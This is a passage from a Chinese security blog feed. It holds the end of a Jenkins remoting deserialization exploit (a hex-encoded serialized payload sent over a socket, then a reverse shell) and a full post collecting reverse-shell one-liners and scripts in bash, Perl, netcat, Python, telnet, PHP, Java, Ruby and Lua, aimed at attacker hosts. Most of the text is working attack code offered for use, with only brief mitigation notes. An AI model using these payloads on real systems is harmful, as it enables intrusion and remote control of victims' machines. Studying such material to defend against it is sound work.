x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'sending payload...'</span></span><br><span class="line">sock.send(payload)</span><br></pre></td></tr></table></figure><p>最后发包第一部分实际为“&lt;===[JENKINS REMOTING CA PACITY]===&gt;”的十六进制，貌似jenkins客户端发包里开头都是这个，第二部分为替换原有序列化对象的构造对象，第三部分为原有包里剩下的部分，直接从wirehsark copy</p><ol><li>反弹shell<br><img src="http://i1.piimg.com/567571/5a347e02f97fefaf.png" alt="image"><br>对于漏洞主机，可以这么利用。<br><img src="http://i1.piimg.com/567571/6b5f0cb7f290ad61.png" alt="image"><br>远程主机未装nc<br><img src="http://i1.piimg.com/567571/96b01a4f7477367c.png" alt="image"><br><img src="http://i1.piimg.com/567571/1f8730f4aa1d8a62.png" alt="image"><br><img src="http://i1.piimg.com/567571/fdc0940aee863e9d.png" alt="image"></li></ol><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><ol><li>WebLogic, WebSphere, JBoss, Jenkins, and OpenNMS等java应用都曾受过该漏洞影响。Apache Commons Collections这样的基础库非常多的Java应用都在用，一旦编程人员误用了反序列化这一机制，使得用户输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的问题，WebLogic等存在此问题的应用可能只是冰山一角。</li><li>首先拿到一个漏洞应用，需要找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用（例如readObject()）来寻找，也可以直接通过对应用交互流量进行抓包，查看流量中是否包含序列化数据来判断，如java序列化数据的特征为以标记（ac ed 00 05）开头。确定了反序列化输入点后，再考察应用的Class Path中是否包含相应的基础库，如Apache Commons Collections库，可通过“grep -R InvokerTransformer .”确认是否包含exp需要的类库（把“InvokerTransformer”删除干净则此漏洞便无法触发）。</li><li><img src="http://p1.bqimg.com/567571/c966099afbe860de.png" alt="image"><br>新版本虽然抓不到端口信息了，但是exp需要的基础类库仍然存在。</li><li>解决方法：可以加入防火墙过滤相应端口的通信。假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。使用加密通信，如SSL。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，也便于进行网络传输；反序列化即逆过程，由字节流还原成对象。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="序列化" scheme="https://michaelwayneliu.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>linux反弹shell姿势</title>
    <link href="https://michaelwayneliu.github.io/2017/02/15/first/"/>
    <id>https://michaelwayneliu.github.io/2017/02/15/first/</id>
    <published>2017-02-15T06:59:07.000Z</published>
    <updated>2017-03-06T13:52:54.250Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://p1.bpimg.com/567571/fd99badf0491cb40.png" alt="image"><br>遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。</p><a id="more"></a><ul><li>首先，选一个未被目标防火墙过滤的TCP端口</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker$ nc -l -v attackerip 4444</span><br></pre></td></tr></table></figure><ul><li><strong>Bash</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line">2. cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span>  <span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li><strong>Perl</strong>           </li></ul><p>不依赖于/bin/sh</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><p>如果是目标基于windows，还可以</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><p>也可上传一个</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.pl</span></span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">"x.x.x.x"</span>;</span><br><span class="line">$p=<span class="number">8080</span>;</span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">            &#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>Netcat</strong>  </li></ul><p>取决于nc的版本，在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个GAPING_SECURITY_HOLE常量)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 4444</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc attackerip 4444</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果没有权限使用mkfifo /tmp/backpipe也可以创建一个管道</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. mknod /tmp/backpipe p</span><br><span class="line">2. /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure><ul><li><strong>python</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'10.16.44.100'</span> <span class="comment"># The remote host</span></span><br><span class="line">PORT = <span class="number">443</span> <span class="comment"># The same port as used by the server</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># connect to attacker machine</span></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"><span class="comment"># send we are connected</span></span><br><span class="line">s.send(<span class="string">'[*] Connection Established!'</span>)</span><br><span class="line"><span class="comment"># start loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment"># recieve shell command</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># if its quit, then break out and close socket</span></span><br><span class="line"><span class="keyword">if</span> data == <span class="string">"quit"</span>: <span class="keyword">break</span></span><br><span class="line"><span class="comment"># do shell command</span></span><br><span class="line">proc = subprocess.Popen(data, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment"># read output</span></span><br><span class="line">stdout_value = proc.stdout.read() + proc.stderr.read()</span><br><span class="line"><span class="comment"># send output to attacker</span></span><br><span class="line">s.send(stdout_value)</span><br><span class="line"><span class="comment"># close socket</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><ul><li><strong>Telnet</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><p>本地在4445端口监听<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445</span><br></pre></td></tr></table></figure></p><ul><li><strong>PHP</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><ul><li><strong>JAVA</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><ul><li><strong>Ruby</strong>    </li></ul><p>目标基于linux<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p><p>目标基于windows<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p><ul><li><strong>lua</strong></li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><p>参考链接：<br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="noopener">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://p1.bpimg.com/567571/fd99badf0491cb40.png&quot; alt=&quot;image&quot;&gt;&lt;br&gt;遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。&lt;/p&gt;
    
    </summary>
    
    
      <category term="反弹shell" scheme="https://michaelwayneliu.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
</feed>
